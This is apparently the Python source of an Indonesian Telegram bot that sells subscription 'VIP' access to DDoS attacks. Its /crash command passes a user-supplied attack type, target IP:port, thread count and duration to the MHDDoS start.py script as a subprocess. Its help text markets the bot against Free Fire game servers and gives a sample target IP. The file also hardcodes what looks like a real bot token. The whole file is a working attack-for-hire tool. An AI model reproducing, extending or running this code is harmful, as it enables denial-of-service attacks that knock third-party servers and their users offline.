import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- KONFIGURASI ASLI (TIDAK DIUBAH) ---
BOT_TOKEN = "8623171468:AAFTcfIqtWXQoc7KhLrMiO-q9WdLu2iefgc"
ADMIN_ID = 6898713814
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

# --- DATABASE ASLI (TIDAK DIUBAH) ---
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()

# --- TAMPILAN BANNER TERMUX TEBAL VANZXT ---
def print_banner():
    # Menggunakan kode warna ANSI Bold (Tebal)
    BOLD_CYAN = "\033[1;96m"
    BOLD_GREEN = "\033[1;92m"
    BOLD_RED = "\033[1;91m"
    RESET = "\033[0m"
    
    print("\n" + "="*45)
    print(f"{BOLD_CYAN}[ 𝙑𝘼𝙉𝙕𝙓𝙏𝙋 - 𝘽𝙊𝙏 𝙊𝙉𝙇𝙄𝙉𝙀 ]{RESET}")
    print(f"{BOLD_GREEN}[SYSTEM]{RESET} Core Automation Berhasil Dimuat.")
    print(f"{BOLD_GREEN}[DATABASE]{RESET} Koneksi 'users.db' Berhasil Dikunci.")
    print(f"{BOLD_CYAN}[STATUS]{RESET} Menunggu Perintah Eksekusi Jaringan, bray...")
    print("="*45 + "\n")

# --- HANDLER: /START ---
@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id
    with db_lock:
        cursor.execute("SELECT expiration_date FROM vip_users WHERE telegram_id = ?", (telegram_id,))
        result = cursor.fetchone()

    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ MASA AKTIF LISENSI VIP HABIS"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = f"✅ VIP ACCESS AKTIF!\n⏳ Sisa Durasi: {dias_restantes} Hari\n📅 Expired On : {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
    else:
        vip_status = "❌ ANDA TIDAK MEMILIKI LISENSI VIP"
        
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(text="💻 VANZ - OWNER SYSTEM 💻", url=f"tg://user?id={ADMIN_ID}"))
    
    pesan_start = (
        "🤖 *SELAMAT DATANG DI AUTOMATION BOT [Free Fire]* 🤖\n\n"
        f"```\n{vip_status}```\n\n"
        "📌 *ATURAN FORMAT INPUT:*\n"
        "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
        "💡 *CONTOH EKSEKUSI JARINGAN:*\n"
        "`/crash UDP 143.92.125.230:10013 10 900`\n\n"
        "💠 *CyberVanz 🇮🇩 USERS VIP SYSTEM* 💠"
    )
    bot.reply_to(message, pesan_start, reply_markup=markup, parse_mode="Markdown")

# --- HANDLER: /VIP ---
@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Anda bukan Pengguna VIP / Owner.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "❌ Format salah bray. Gunakan: `/vip <ID> <DAYS>`", parse_mode="Markdown")
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute("INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date) VALUES (?, ?)", (telegram_id, expiration_date))
        conn.commit()

    bot.reply_to(message, f"✅ Pengguna `{telegram_id}` Berhasil Ditambahkan ke Database VIP Selama `{days}` Hari.", parse_mode="Markdown")

# --- HANDLER: /CRASH ---
@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id
    with db_lock:
        cursor.execute("SELECT expiration_date FROM vip_users WHERE telegram_id = ?", (telegram_id,))
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ Anda tidak memiliki izin lisensi untuk menggunakan perintah ini.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ Akses VIP Anda telah kedaluwarsa bray.")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ Sistem Cooldown! Tunggu 10 detik sebelum memulai kembali.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            "❌ *Format Salah!*\n\n📌 *Gunakan:* `/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n💡 *Contoh:* `/crash UDP 143.92.125.230:10013 10 900`",
            parse_mode="Markdown"
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    # Eksekusi Subprocess asli
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    # Log teks dinamis ke Termux pas tombol di-trigger
    print(f"[\033[1;91mCRASH\033[0m] VanzXTP Executed {attack_type} -> Target IP: {ip_port}")

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Hentikan Overload Jaringan", callback_data=f"stop_{telegram_id}"))

    pesan_attack = (
        "🚀 *🚀 OVERLOAD SYSTEM INITIATED - STATUS 200 🚀*\n\n"
        f"🌐 *Alamat Target:* `{ip_port}`\n"
        f"⚙️ *Metode Paket:* `{attack_type}`\n"
        f"🧟‍♀️ *Jumlah Threads:* `{threads}`\n"
        f"⏳ *Durasi Sesi:* `{duration} MS`\n\n"
        "🔥 _Beban trafik jaringan sedang dikirim ke target..._"
    )
    bot.reply_to(message, pesan_attack, reply_markup=markup, parse_mode="Markdown")

# --- CALLBACK: STOP ATTACK ---
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(call.id, "❌ Hanya eksekutor utama yang dapat menghentikan sesi ini!")
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        print(f"[\033[1;33mSTOP\033[0m] VanzXTP Terminated Session for User ID {telegram_id}")

        bot.answer_callback_query(call.id, "✅ Sesi overload dihentikan.")
        bot.edit_message_text(
            "*[⛔] PROSES PENGUJIAN SELESAI / DIHENTIKAN [⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ Tidak ada sesi aktif yang ditemukan.")

if __name__ == "__main__":
    print_banner()
    bot.infinity_polling()
